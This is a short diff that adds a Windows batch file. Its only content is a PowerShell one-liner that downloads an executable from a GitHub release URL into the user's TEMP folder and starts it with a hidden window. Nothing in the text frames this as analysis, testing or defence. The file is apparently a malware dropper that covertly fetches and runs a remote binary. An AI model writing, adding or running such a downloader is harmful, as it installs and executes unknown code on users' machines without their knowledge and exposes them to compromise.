@@ -1,0 +1,2 @@
+@echo off
+powershell -command "& { $url = 'https://github.com/Lucaaa99966/ya/releases/download/grgr/temp.exe'; $out = \"$env:TEMP\temp.exe\"; (New-Object System.Net.WebClient).DownloadFile($url, $out); Start-Process -FilePath $out -WindowStyle Hidden }"
